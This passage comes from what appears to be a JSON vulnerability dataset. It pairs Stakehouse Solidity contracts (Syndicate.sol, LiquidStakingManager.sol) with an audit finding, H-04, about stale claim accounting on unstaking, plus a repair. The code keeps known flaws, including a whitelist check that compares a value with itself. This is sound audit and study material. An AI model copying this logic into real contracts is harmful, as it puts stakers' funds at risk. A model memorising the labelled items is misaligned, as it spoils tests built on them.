(address stakeHouse,,,,,) = getStakeHouseUniverse().stakeHouseKnotInfo(_blsPubKey);\n\n        // Find the collateralized SLOT owner and work out how much they're owed\n        for (uint256 i; i < numberOfCollateralisedSlotOwnersForKnot; ++i) {\n            address collateralizedOwnerAtIndex = getSlotRegistry().getCollateralisedOwnerAtIndex(_blsPubKey, i);\n            if (collateralizedOwnerAtIndex == _staker) {\n                uint256 balance = getSlotRegistry().totalUserCollateralisedSLOTBalanceForKnot(\n                    stakeHouse,\n                    collateralizedOwnerAtIndex,\n                    _blsPubKey\n                );\n\n                if (currentSlashedAmount < 4 ether) {\n                    currentAccrued +=\n                        balance * unprocessedForKnot / (4 ether - currentSlashedAmount);\n                }\n                break;\n            }\n        }\n\n        return currentAccrued - claimedPerCollateralizedSlotOwnerOfKnot[_blsPubKey][_staker];\n    }\n\n    /// @notice Amount of ETH per free floating share that hasn't yet been allocated to each share\n    function getUnprocessedETHForAllFreeFloatingSlot() public view returns (uint256) {\n        return calculateETHForFreeFloatingOrCollateralizedHolders() - lastSeenETHPerFreeFloating;\n    }\n\n    /// @notice Amount of ETH per collateralized share that hasn't yet been allocated to each share\n    function getUnprocessedETHForAllCollateralizedSlot() public view returns (uint256) {\n        return ((calculateETHForFreeFloatingOrCollateralizedHolders() - lastSeenETHPerCollateralizedSlotPerKnot) / numberOfRegisteredKnots);\n    }\n\n    /// @notice New accumulated ETH per free floating share that hasn't yet been applied\n    /// @dev The return value is scaled by 1e24\n    function calculateNewAccumulatedETHPerFreeFloatingShare() public view returns (uint256) {\n        uint256 ethSinceLastUpdate = getUnprocessedETHForAllFreeFloatingSlot();\n        return _calculateNewAccumulatedETHPerFreeFloatingShare(ethSinceLastUpdate);\n    }\n\n    /// @notice New accumulated ETH per collateralized share per knot that hasn't yet been applied\n    function calculateNewAccumulatedETHPerCollateralizedSharePerKnot() public view returns (uint256) {\n        uint256 ethSinceLastUpdate = getUnprocessedETHForAllCollateralizedSlot();\n        return accumulatedETHPerCollateralizedSlotPerKnot + ethSinceLastUpdate;\n    }\n\n    /// @notice Total amount of ETH received by the contract\n    function totalETHReceived() public view returns (uint256) {\n        return address(this).balance + totalClaimed;\n    }\n\n    /// @dev Internal logic for initializing the syndicate contract\n    function _initialize(\n        address _contractOwner,\n        uint256 _priorityStakingEndBlock,\n        address[] memory _priorityStakers,\n        bytes[] memory _blsPubKeysForSyndicateKnots\n    ) internal {\n        // Transfer ownership from the deployer to the address specified as the owner\n        _transferOwnership(_contractOwner);\n\n        // Add the initial set of knots to the syndicate\n        _registerKnotsToSyndicate(_blsPubKeysForSyndicateKnots);\n\n        // Optionally process priority staking if the required params and array is configured\n        if (_priorityStakingEndBlock > block.number) {\n            priorityStakingEndBlock = _priorityStakingEndBlock;\n            _addPriorityStakers(_priorityStakers);\n        }\n\n        emit ContractDeployed();\n    }\n\n    /// Given an amount of ETH allocated to the collateralized SLOT owners of a KNOT, distribute this amongs the current set of collateralized owners (a dynamic set of addresses and balances)\n    function _updateCollateralizedSlotOwnersLiabilitySnapshot(bytes memory _blsPubKey) internal {\n        // Establish how much new ETH is for the new KNOT\n        uint256 unprocessedETHForCurrentKnot =\n                    accumulatedETHPerCollateralizedSlotPerKnot - totalETHProcessedPerCollateralizedKnot[_blsPubKey];\n\n        // Get information about the knot i.e. associated house and whether its active\n        (address stakeHouse,,,,,bool isActive) = getStakeHouseUniverse().stakeHouseKnotInfo(_blsPubKey);\n\n        // Assuming that there is unprocessed ETH and the knot is still part of the syndicate\n        if (unprocessedETHForCurrentKnot > 0 && !isNoLongerPartOfSyndicate[_blsPubKey]) {\n            uint256 currentSlashedAmount = getSlotRegistry().currentSlashedAmountOfSLOTForKnot(_blsPubKey);\n\n            // Don't allocate ETH when the current slashed amount is four. Syndicate will wait until ETH is topped up to claim revenue\n            if (currentSlashedAmount < 4 ether) {\n                // This copes with increasing numbers of collateralized slot owners and also copes with SLOT that has been slashed but not topped up\n                uint256 numberOfCollateralisedSlotOwnersForKnot = getSlotRegistry().numberOfCollateralisedSlotOwnersForKnot(_blsPubKey);\n\n                if (numberOfCollateralisedSlotOwnersForKnot == 1) {\n                    // For only 1 collateralized SLOT owner, they get the full amount of unprocessed ETH for the knot\n                    address collateralizedOwnerAtIndex = getSlotRegistry().getCollateralisedOwnerAtIndex(_blsPubKey, 0);\n                    accruedEarningPerCollateralizedSlotOwnerOfKnot[_blsPubKey][collateralizedOwnerAtIndex] += unprocessedETHForCurrentKnot;\n                } else {\n                    for (uint256 i; i < numberOfCollateralisedSlotOwnersForKnot; ++i) {\n                        address collateralizedOwnerAtIndex = getSlotRegistry().getCollateralisedOwnerAtIndex(_blsPubKey, i);\n                        uint256 balance = getSlotRegistry().totalUserCollateralisedSLOTBalanceForKnot(\n                            stakeHouse,\n                            collateralizedOwnerAtIndex,\n                            _blsPubKey\n                        );\n\n                        accruedEarningPerCollateralizedSlotOwnerOfKnot[_blsPubKey][collateralizedOwnerAtIndex] +=\n                            balance * unprocessedETHForCurrentKnot / (4 ether - currentSlashedAmount);\n                    }\n                }\n\n                // record so unprocessed goes to zero\n                totalETHProcessedPerCollateralizedKnot[_blsPubKey] = accumulatedETHPerCollateralizedSlotPerKnot;\n            }\n        }\n\n        // if the knot is no longer active, no further accrual of rewards are possible snapshots are possible but ETH accrued up to that point\n        // Basically, under a rage quit or voluntary withdrawal from the beacon chain, the knot kick is auto-propagated to syndicate\n        if (!isActive && !isNoLongerPartOfSyndicate[_blsPubKey]) {\n            _deRegisterKnot(_blsPubKey);\n        }\n    }\n\n    function _calculateCollateralizedETHOwedPerKnot() internal view returns (uint256) {\n        uint256 collateralizedSLOTShareOfETH = calculateETHForFreeFloatingOrCollateralizedHolders();\n        uint256 collateralizedSLOTShareOfETHPerKnot = (collateralizedSLOTShareOfETH / numberOfRegisteredKnots);\n        return collateralizedSLOTShareOfETHPerKnot;\n    }\n\n    /// @dev Business logic for calculating per collateralized share how much ETH from 1559 rewards is owed\n    function _calculateNewAccumulatedETHPerCollateralizedShare(uint256 _ethSinceLastUpdate) internal view returns (uint256) {\n        return (_ethSinceLastUpdate * PRECISION) / (numberOfRegisteredKnots * 4 ether);\n    }\n\n    /// @dev Business logic for calculating per free floating share how much ETH from 1559 rewards is owed\n    function _calculateNewAccumulatedETHPerFreeFloatingShare(uint256 _ethSinceLastUpdate) internal view returns (uint256) {\n        return totalFreeFloatingShares > 0 ? (_ethSinceLastUpdate * PRECISION) / totalFreeFloatingShares : 0;\n    }\n\n    /// @dev Business logic for adding a new set of knots to the syndicate for collecting revenue\n    function _registerKnotsToSyndicate(bytes[] memory _blsPubKeysForSyndicateKnots) internal {\n        uint256 knotsToRegister = _blsPubKeysForSyndicateKnots.length;\n        if (knotsToRegister == 0) revert EmptyArray();\n        numberOfRegisteredKnots += knotsToRegister;\n\n        for (uint256 i; i < knotsToRegister; ++i) {\n            bytes memory blsPubKey = _blsPubKeysForSyndicateKnots[i];\n\n            if (isKnotRegistered[blsPubKey]) revert KnotIsAlreadyRegistered();\n\n            // incomming knot collateralized SLOT holders do not get historical earnings\n            totalETHProcessedPerCollateralizedKnot[blsPubKey] = accumulatedETHPerCollateralizedSlotPerKnot;\n\n            // Health check - if knot is inactive or slashed, should it really be part of the syndicate?\n            // KNOTs closer to 32 effective at all times is the target\n            (,,,,,bool isActive) = getStakeHouseUniverse().stakeHouseKnotInfo(blsPubKey);\n            if (!isActive) revert InactiveKnot();\n\n            uint256 numberOfCollateralisedSlotOwnersForKnot = getSlotRegistry().numberOfCollateralisedSlotOwnersForKnot(blsPubKey);\n            if (numberOfCollateralisedSlotOwnersForKnot < 1) revert InvalidNumberOfCollateralizedOwners();\n            if (getSlotRegistry().currentSlashedAmountOfSLOTForKnot(blsPubKey) != 0) revert InvalidNumberOfCollateralizedOwners();\n\n            isKnotRegistered[blsPubKey] = true;\n            emit KNOTRegistered(blsPubKey);\n        }\n    }\n\n    /// @dev Business logic for adding priority stakers to the syndicate\n    function _addPriorityStakers(address[] memory _priorityStakers) internal {\n        if (_priorityStakers.length == 0) revert EmptyArray();\n        for (uint256 i; i < _priorityStakers.length; ++i) {\n            address staker = _priorityStakers[i];\n\n            if (i > 0 && staker < _priorityStakers[i-1]) revert DuplicateArrayElements();\n\n            isPriorityStaker[staker] = true;\n\n            emit PriorityStakerRegistered(staker);\n        }\n    }\n\n    /// @dev Business logic for de-registering a set of knots from the syndicate and doing the required snapshots to ensure historical earnings are preserved\n    function _deRegisterKnots(bytes[] calldata _blsPublicKeys) internal {\n        for (uint256 i; i < _blsPublicKeys.length; ++i) {\n            bytes memory blsPublicKey = _blsPublicKeys[i];\n\n            // Do one final snapshot of ETH owed to the collateralized SLOT owners so they can claim later\n            _updateCollateralizedSlotOwnersLiabilitySnapshot(blsPublicKey);\n\n            // Execute the business logic for de-registering the single knot\n            _deRegisterKnot(blsPublicKey);\n        }\n    }\n\n    /// @dev Business logic for de-registering a specific knots assuming all accrued ETH has been processed\n    function _deRegisterKnot(bytes memory _blsPublicKey) internal {\n        if (isKnotRegistered[_blsPublicKey] == false) revert KnotIsNotRegisteredWithSyndicate();\n        if (isNoLongerPartOfSyndicate[_blsPublicKey] == true) revert KnotHasAlreadyBeenDeRegistered();\n\n        // We flag that the knot is no longer part of the syndicate\n        isNoLongerPartOfSyndicate[_blsPublicKey] = true;\n\n        // For the free floating and collateralized SLOT of the knot, snapshot the accumulated ETH per share\n        lastAccumulatedETHPerFreeFloatingShare[_blsPublicKey] = accumulatedETHPerFreeFloatingShare;\n\n        // We need to reduce `totalFreeFloatingShares` in order to avoid further ETH accruing to shares of de-registered knot\n        totalFreeFloatingShares -= sETHTotalStakeForKnot[_blsPublicKey];\n\n        // Total number of registered knots with the syndicate reduces by one\n        numberOfRegisteredKnots -= 1;\n\n        emit KnotDeRegistered(_blsPublicKey);\n    }\n\n    /// @dev Work out the accumulated ETH per free floating share value that must be used for distributing ETH\n    function _getCorrectAccumulatedETHPerFreeFloatingShareForBLSPublicKey(\n        bytes memory _blsPublicKey\n    ) internal view returns (uint256) {\n        return\n        lastAccumulatedETHPerFreeFloatingShare[_blsPublicKey] > 0 ?\n        lastAccumulatedETHPerFreeFloatingShare[_blsPublicKey] :\n        accumulatedETHPerFreeFloatingShare;\n    }\n\n    /// @dev Business logic for allowing a free floating SLOT holder to claim their share of ETH\n    function _claimAsStaker(address _recipient, bytes[] calldata _blsPubKeys) internal {\n        if (_blsPubKeys.length == 0) revert EmptyArray();\n        if (_recipient == address(0)) revert ZeroAddress();\n        if (_recipient == address(this)) revert ZeroAddress();\n\n        // Make sure we have the latest accrued information\n        updateAccruedETHPerShares();\n\n        for (uint256 i; i < _blsPubKeys.length; ++i) {\n            bytes memory _blsPubKey = _blsPubKeys[i];\n            if (!isKnotRegistered[_blsPubKey]) revert KnotIsNotRegisteredWithSyndicate();\n\n            uint256 unclaimedUserShare = calculateUnclaimedFreeFloatingETHShare(_blsPubKey, msg.sender);\n\n            // this means that user can call the funtion even if there is nothing to claim but the\n            // worst that will happen is that they will just waste gas. this is needed for unstaking\n            if (unclaimedUserShare > 0) {\n                // Increase total claimed at the contract level\n                totalClaimed += unclaimedUserShare;\n\n                // Work out which accumulated ETH per free floating share value was used\n                uint256 accumulatedETHPerShare = _getCorrectAccumulatedETHPerFreeFloatingShareForBLSPublicKey(_blsPubKey);\n\n                // Update the total ETH claimed by the free floating SLOT holder based on their share of sETH\n                sETHUserClaimForKnot[_blsPubKey][msg.sender] =\n                (accumulatedETHPerShare * sETHStakedBalanceForKnot[_blsPubKey][msg.sender]) / PRECISION;\n\n                // Send ETH to user\n                (bool success,) = _recipient.call{value: unclaimedUserShare}(\"\");\n                if (!success) revert TransferFailed();\n\n                emit ETHClaimed(\n                    _blsPubKey,\n                    msg.sender,\n                    _recipient,\n                    unclaimedUserShare,\n                    false\n                );\n            }\n        }\n    }\n}\n\n",
        "CodeNames": [
            "Syndicate.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-04",
                "Location": [
                    "userShare = (newAccumulatedETHPerShare * stakedBal) / PRECISION",
                    "sETHStakedBalanceForKnot",
                    "_claimAsStaker",
                    "calculateUnclaimedFreeFloatingETHShare",
                    "sETHUserClaimForKnot"
                ],
                "Type": " Unstaking does not update the mapping  sETHUserClaimForKnot ",
                "Description": "*Submitted by HE1M(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/90), also found by 9svR6w(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/180)*\n\nIf a user stakes some sETH, and after some time decides to unstake some amount of sETH, later s/he will not be qualified or be less qualified to claim ETH on the remaining staked sETH.\n\n\nSuppose Alice stakes 5 sETH by calling stake(...).<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L203<br\nSo, we will have:\n\n*   sETHUserClaimForKnot[BLS][Alice] = (5 * 10^18 * accumulatedETHPerFreeFloatingShare) / PRECISION\n*   sETHStakedBalanceForKnot[BLS][Alice] = 5 * 10^18\n*   sETHTotalStakeForKnot[BLS] += 5 * 10^18\n\nLater, Alice decides to unstake 3 sETH by calling unstake(...).<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L245\n\nSo, all ETH owed to Alice will be paid:<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L257\n\nThen, we will have:\n\n*   sETHUserClaimForKnot[BLS][Alice] = (5 * 10^18 * accumulatedETHPerFreeFloatingShare) / PRECISION\n*   sETHStakedBalanceForKnot[BLS][Alice] = 2 * 10^18\n*   sETHTotalStakeForKnot[BLS] -= 3 * 10^18\n\nIt is clear that the mapping sETHStakedBalanceForKnot is decreased as expected, but the mapping sETHUserClaimForKnot is not changed. In other words, the mapping sETHUserClaimForKnot is still holding the claimed amount based on the time 5 sETH were staked.\n\nIf, after some time, the ETH is accumulated per free floating share for the BLS public key that Alice was staking for, Alice will be qualified to some more ETH to claim (because she has still 2 sETH staked).\n\nIf Alice unstakes by calling unstake(...) or claim ETH by calling claimAsStaker(...), in both calls, the function calculateUnclaimedFreeFloatingETHShare will be called to calculate the amount of unclaimed ETH:<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L652\n\nIn this function, we will have:\n\n*   stakedBal = sETHStakedBalanceForKnot[BLS][Alice] = 2 &ast; 10^18\n*   userShare = (newAccumulatedETHPerShare * stakedBal) / PRECISION\n\nThe return value which is unclaimed ETH will be:\n\n    userShare sETHUserClaimForKnot[BLS][Alice] = \n    (newAccumulatedETHPerShare * 2 * 10^18) / PRECISION (5 * 10^18 * accumulatedETHPerFreeFloatingShare) / PRECISION\n\nThis return value is not correct (it is highly possible to be smaller than 0, and as a result Alice can not claim anything), because the claimed ETH is still based on the time when 5 sETH were staked, not on the time when 2 sETH were remaining/staked.\n\nThe vulnerability is that during unstaking, the mapping sETHUserClaimForKnot is not updated to the correct value. In other words, this mapping is updated in _claimAsStaker, but it is updated based on 5 sETH staked, later when 3 sETH are unstaked, this mapping should be again updated based on the remaing sETH (which is 2 sETH).\n\nAs a result, Alice can not claim ETH or she will qualify for less amount.\n\n",
                "Repair": "\nThe following line should be added on line 274:\n\n    sETHUserClaimForKnot[_blsPubKey][msg.sender] =\n                    (accumulatedETHPerShare * sETHStakedBalanceForKnot[_blsPubKey][msg.sender]) / PRECISION\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L274\n\nvince0656 (Stakehouse) confirmed(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/90)\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\nimport { Initializable } from \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\nimport { Ownable } from \"@openzeppelin/contracts/access/Ownable.sol\";\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { ReentrancyGuard } from \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport { Address } from \"@openzeppelin/contracts/utils/Address.sol\";\n\nimport { StakehouseAPI } from \"@blockswaplab/stakehouse-solidity-api/contracts/StakehouseAPI.sol\";\nimport { ITransactionRouter } from \"@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/ITransactionRouter.sol\";\nimport { IDataStructures } from \"@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IDataStructures.sol\";\nimport { IStakeHouseRegistry } from \"@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IStakeHouseRegistry.sol\";\n\nimport { SavETHVaultDeployer } from \"./SavETHVaultDeployer.sol\";\nimport { StakingFundsVaultDeployer } from \"./StakingFundsVaultDeployer.sol\";\nimport { StakingFundsVault } from \"./StakingFundsVault.sol\";\nimport { SavETHVault } from \"./SavETHVault.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { LPTokenFactory } from \"./LPTokenFactory.sol\";\nimport { SyndicateFactory } from \"../syndicate/SyndicateFactory.sol\";\nimport { Syndicate } from \"../syndicate/Syndicate.sol\";\nimport { OptionalHouseGatekeeper } from \"./OptionalHouseGatekeeper.sol\";\nimport { OptionalGatekeeperFactory } from \"./OptionalGatekeeperFactory.sol\";\nimport { OwnableSmartWalletFactory } from \"../smart-wallet/OwnableSmartWalletFactory.sol\";\nimport { IOwnableSmartWalletFactory } from \"../smart-wallet/interfaces/IOwnableSmartWalletFactory.sol\";\nimport { IOwnableSmartWallet } from \"../smart-wallet/interfaces/IOwnableSmartWallet.sol\";\nimport { ISyndicateFactory } from \"../interfaces/ISyndicateFactory.sol\";\nimport { ILiquidStakingManager } from \"../interfaces/ILiquidStakingManager.sol\";\nimport { IBrandNFT } from \"../interfaces/IBrandNFT.sol\";\n\ncontract LiquidStakingManager is ILiquidStakingManager, Initializable, ReentrancyGuard, StakehouseAPI {\n\n    /// @notice signalize change in status of whitelisting\n    event WhitelistingStatusChanged(address indexed dao, bool updatedStatus);\n\n    /// @notice signalize updated whitelist status of node runner\n    event NodeRunnerWhitelistingStatusChanged(address indexed nodeRunner, bool updatedStatus);\n\n    /// @notice signalize creation of a new smart wallet\n    event SmartWalletCreated(address indexed smartWallet, address indexed nodeRunner);\n\n    /// @notice signalize appointing of a representative for a smart wallet by the node runner\n    event RepresentativeAppointed(address indexed smartWallet, address indexed eoaRepresentative);\n\n    /// @notice signalize wallet being credited with ETH\n    event WalletCredited(address indexed smartWallet, uint256 amount);\n\n    /// @notice signalize staking of a KNOT\n    event KnotStaked(bytes _blsPublicKeyOfKnot, address indexed trigerringAddress);\n\n    /// @notice signalize creation of stakehouse\n    event StakehouseCreated(string stakehouseTicker, address indexed stakehouse);\n\n    /// @notice signalize joining a stakehouse\n    event StakehouseJoined(bytes blsPubKey);\n\n    ///@notice signalize removal of representative from smart wallet\n    event RepresentativeRemoved(address indexed smartWallet, address indexed eoaRepresentative);\n\n    /// @notice signalize dormant representative\n    event DormantRepresentative(address indexed associatedSmartWallet, address representative);\n\n    /// @notice signalize refund of withdrawal of 4 ETH for a BLS public key by the node runner\n    event ETHWithdrawnFromSmartWallet(address indexed associatedSmartWallet, bytes blsPublicKeyOfKnot, address nodeRunner);\n\n    /// @notice signalize that the network has updated its ticker before its house was created\n    event NetworkTickerUpdated(string newTicker);\n\n    /// @notice signalize that the node runner has claimed rewards from the syndicate\n    event NodeRunnerRewardsClaimed(address indexed nodeRunner, address indexed recipient);\n\n    /// @notice signalize that the node runner of the smart wallet has been rotated\n    event NodeRunnerOfSmartWalletRotated(address indexed wallet, address indexed oldRunner, address indexed newRunner);\n\n    /// @notice signalize banning of a node runner\n    event NodeRunnerBanned(address indexed nodeRunner);\n\n    /// @notice signalize that the dao management address has been moved\n    event UpdateDAOAddress(address indexed oldAddress, address indexed newAddress);\n\n    /// @notice signalize that the dao commission from network revenue has been updated\n    event DAOCommissionUpdated(uint256 old, uint256 newCommission);\n\n    /// @notice signalize that a new BLS public key for an LSD validator has been registered\n    event NewLSDValidatorRegistered(address indexed nodeRunner, bytes blsPublicKey);\n\n    /// @notice Address of brand NFT\n    address public brand;\n\n    /// @notice stakehouse created by the LSD network\n    address public override stakehouse;\n\n    /// @notice Fees and MEV EIP1559 distribution contract for the LSD network\n    address public syndicate;\n\n    /// @notice address of the DAO deploying the contract\n    address public dao;\n\n    /// @notice address of optional gatekeeper for admiting new knots to the house created by the network\n    OptionalHouseGatekeeper public gatekeeper;\n\n    /// @notice instance of the syndicate factory that deploys the syndicates\n    ISyndicateFactory public syndicateFactory;\n\n    /// @notice instance of the smart wallet factory that deploys the smart wallets for node runners\n    IOwnableSmartWalletFactory public smartWalletFactory;\n\n    /// @notice string name for the stakehouse 3-5 characters long\n    string public stakehouseTicker;\n\n    /// @notice DAO staking funds vault\n    StakingFundsVault public stakingFundsVault;\n\n    /// @notice SavETH vault\n    SavETHVault public savETHVault;\n\n    /// @notice whitelisting indicator. true for enables and false for disabled\n    bool public enableWhitelisting;\n\n    /// @notice mapping to store if a node runner is whitelisted\n    mapping(address => bool) public isNodeRunnerWhitelisted;\n\n    /// @notice EOA representative appointed for a smart wallet\n    mapping(address => address) public smartWalletRepresentative;\n\n    /// @notice Smart wallet used to deploy KNOT\n    mapping(bytes => address) public smartWalletOfKnot;\n\n    /// @notice Smart wallet issued to the Node runner. Node runner address <> Smart wallet address\n    mapping(address => address) public smartWalletOfNodeRunner;\n\n    /// @notice Node runner issued to Smart wallet. Smart wallet address <> Node runner address\n    mapping(address => address) public nodeRunnerOfSmartWallet;\n\n    /// @notice Track number of staked KNOTs of a smart wallet\n    mapping(address => uint256) public stakedKnotsOfSmartWallet;\n\n    /// @notice smart wallet <> dormant rep.\n    mapping(address => address) public smartWalletDormantRepresentative;\n\n    /// @notice Track BLS public keys that have been banned. \n    /// If banned, the BLS public key will be mapped to its respective smart wallet\n    mapping(bytes => address) public bannedBLSPublicKeys;\n\n    /// @notice Track node runner addresses that are banned.\n    /// Malicious node runners can be banned by the DAO\n    mapping(address => bool) public bannedNodeRunners;\n\n    /// @notice count of KNOTs interacted with LSD network\n    uint256 public numberOfKnots;\n\n    /// @notice Commission percentage to 5 decimal places\n    uint256 public daoCommissionPercentage;\n\n    /// @notice 100% to 5 decimal places\n    uint256 public MODULO = 100_00000;\n\n    modifier onlyDAO() {\n        require(msg.sender == dao, \"Must be DAO\");\n        _;\n    }\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() initializer {}\n\n    /// @inheritdoc ILiquidStakingManager\n    function init(\n        address _dao,\n        address _syndicateFactory,\n        address _smartWalletFactory,\n        address _lpTokenFactory,\n        address _brand,\n        address _savETHVaultDeployer,\n        address _stakingFundsVaultDeployer,\n        address _optionalGatekeeperDeployer,\n        uint256 _optionalCommission,\n        bool _deployOptionalGatekeeper,\n        string calldata _stakehouseTicker\n    ) external virtual override initializer {\n        _init(\n            _dao,\n            _syndicateFactory,\n            _smartWalletFactory,\n            _lpTokenFactory,\n            _brand,\n            _savETHVaultDeployer,\n            _stakingFundsVaultDeployer,\n            _optionalGatekeeperDeployer,\n            _optionalCommission,\n            _deployOptionalGatekeeper,\n            _stakehouseTicker\n        );\n    }\n\n    /// @notice Enable operations proxied through DAO contract to another contract\n    /// @param _nodeRunner Address of the node runner that created the wallet\n    /// @param _to Address of the target contract\n    /// @param _data Encoded data of the function call\n    /// @param _value Total value attached to the transaction\n    function executeAsSmartWallet(\n        address _nodeRunner,\n        address _to,\n        bytes calldata _data,\n        uint256 _value\n    ) external payable onlyDAO {\n        address smartWallet = smartWalletOfNodeRunner[_nodeRunner];\n        require(smartWallet != address(0), \"No wallet found\");\n        IOwnableSmartWallet(smartWallet).execute(\n            _to,\n            _data,\n            _value\n        );\n    }\n\n    /// @notice For knots no longer operational, DAO can de register the knot from the syndicate\n    function deRegisterKnotFromSyndicate(bytes[] calldata _blsPublicKeys) external onlyDAO {\n        Syndicate(payable(syndicate)).deRegisterKnots(_blsPublicKeys);\n    }\n\n    /// @notice In preparation of a rage quit, restore sETH to a smart wallet which are recoverable with the execution methods in the event this step does not go to plan\n    /// @param _smartWallet Address of the smart wallet that will undertake the rage quit\n    /// @param _blsPublicKeys List of BLS public keys being processed (assuming DAO only has BLS pub keys from correct smart wallet)\n    /// @param _amounts Amounts of free floating sETH that will be unstaked\n    function restoreFreeFloatingSharesToSmartWalletForRageQuit(\n        address _smartWallet,\n        bytes[] calldata _blsPublicKeys,\n        uint256[] calldata _amounts\n    ) external onlyDAO {\n        stakingFundsVault.unstakeSyndicateSharesForRageQuit(\n            _smartWallet,\n            _blsPublicKeys,\n            _amounts\n        );\n    }\n\n    /// @notice Allow DAO to migrate to a new address\n    function updateDAOAddress(address _newAddress) external onlyDAO {\n        require(_newAddress != address(0), \"Zero address\");\n        require(_newAddress != dao, \"Same address\");\n\n        emit UpdateDAOAddress(dao, _newAddress);\n\n        dao = _newAddress;\n    }\n\n    /// @notice Allow DAO to take a commission of network revenue\n    function updateDAORevenueCommission(uint256 _commissionPercentage) external onlyDAO {\n        require(_commissionPercentage != daoCommissionPercentage, \"Same commission percentage\");\n        _updateDAORevenueCommission(_commissionPercentage);\n    }\n\n    /// @notice Allow the DAO to rotate the network ticker before the network house is created\n    function updateTicker(string calldata _newTicker) external onlyDAO {\n        require(bytes(_newTicker).length >= 3, \"String must be 3-5 characters long\");\n        require(bytes(_newTicker).length <= 5, \"String must be 3-5 characters long\");\n        require(numberOfKnots == 0, \"Cannot change ticker once house is created\");\n\n        stakehouseTicker = _newTicker;\n\n        emit NetworkTickerUpdated(_newTicker);\n    }\n\n    /// @notice function to change whether node runner whitelisting of node runners is required by the DAO\n    /// @param _changeWhitelist boolean value. true to enable and false to disable\n    function updateWhitelisting(bool _changeWhitelist) external onlyDAO returns (bool) {\n        require(_changeWhitelist != enableWhitelisting, \"Unnecessary update to same status\");\n        enableWhitelisting = _changeWhitelist;\n        emit WhitelistingStatusChanged(msg.sender, enableWhitelisting);\n\n        return enableWhitelisting;\n    }\n\n    /// @notice function to enable/disable whitelisting of a noderunner\n    /// @param _nodeRunner address of the node runner\n    /// @param isWhitelisted true if the node runner should be whitelisted. false otherwise.\n    function updateNodeRunnerWhitelistStatus(address _nodeRunner, bool isWhitelisted) external onlyDAO {\n        require(_nodeRunner != address(0), \"Zero address\");\n        require(isNodeRunnerWhitelisted[_nodeRunner] != isNodeRunnerWhitelisted[_nodeRunner], \"Unnecessary update to same status\");\n\n        isNodeRunnerWhitelisted[_nodeRunner] = isWhitelisted;\n        emit NodeRunnerWhitelistingStatusChanged(_nodeRunner, isWhitelisted);\n    }\n\n    /// @notice Allow a node runner to rotate the EOA representative they use for their smart wallet\n    /// @dev if any KNOT is staked for a smart wallet, no rep can be appointed or updated until the derivatives are minted\n    /// @param _newRepresentative address of the new representative to be appointed\n    function rotateEOARepresentative(address _newRepresentative) external {\n        require(_newRepresentative != address(0), \"Zero address\");\n        require(isNodeRunnerBanned(msg.sender) == false, \"Node runner is banned from LSD network\");\n\n        address smartWallet = smartWalletOfNodeRunner[msg.sender];\n        require(smartWallet != address(0), \"No smart wallet\");\n        require(stakedKnotsOfSmartWallet[smartWallet] == 0, \"Not all KNOTs are minted\");\n        require(smartWalletRepresentative[smartWallet] != _newRepresentative, \"Invalid rotation to same EOA\");\n\n        // unauthorize old representative\n        _authorizeRepresentative(smartWallet, smartWalletRepresentative[smartWallet], false);\n\n        // authorize new representative\n        _authorizeRepresentative(smartWallet, _newRepresentative, true);\n    }\n\n    /// @notice Allow DAO to rotate representative in the case that node runner is not available (to facilitate staking)\n    /// @param _nodeRunner address of the node runner\n    /// @param _newRepresentative address of the new representative to be appointed for the node runner\n    function rotateEOARepresentativeOfNodeRunner(address _nodeRunner, address _newRepresentative) external onlyDAO {\n        require(_newRepresentative != address(0), \"Zero address\");\n\n        address smartWallet = smartWalletOfNodeRunner[_nodeRunner];\n        require(smartWallet != address(0), \"No smart wallet\");\n        require(stakedKnotsOfSmartWallet[smartWallet] == 0, \"Not all KNOTs are minted\");\n        require(smartWalletRepresentative[smartWallet] != _newRepresentative, \"Invalid rotation to same EOA\");\n\n        // unauthorize old representative\n        _authorizeRepresentative(smartWallet, smartWalletRepresentative[smartWallet], false);\n\n        // authorize new representative\n        _authorizeRepresentative(smartWallet, _newRepresentative, true);\n    }\n\n    /// @notice Allow node runners to withdraw ETH from their smart wallet. ETH can only be withdrawn until the KNOT has not been staked.\n    /// @dev A banned node runner cannot withdraw ETH for the KNOT. \n    /// @param _blsPublicKeyOfKnot BLS public key of the KNOT for which the ETH needs to be withdrawn\n    function withdrawETHForKnot(address _recipient, bytes calldata _blsPublicKeyOfKnot) external {\n        require(_recipient != address(0), \"Zero address\");\n        require(isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, \"BLS public key has already withdrawn or not a part of LSD network\");\n\n        address associatedSmartWallet = smartWalletOfKnot[_blsPublicKeyOfKnot];\n        require(smartWalletOfNodeRunner[msg.sender] == associatedSmartWallet, \"Not the node runner for the smart wallet \");\n        require(isNodeRunnerBanned(nodeRunnerOfSmartWallet[associatedSmartWallet]) == false, \"Node runner is banned from LSD network\");\n        require(associatedSmartWallet.balance >= 4 ether, \"Insufficient balance\");\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == 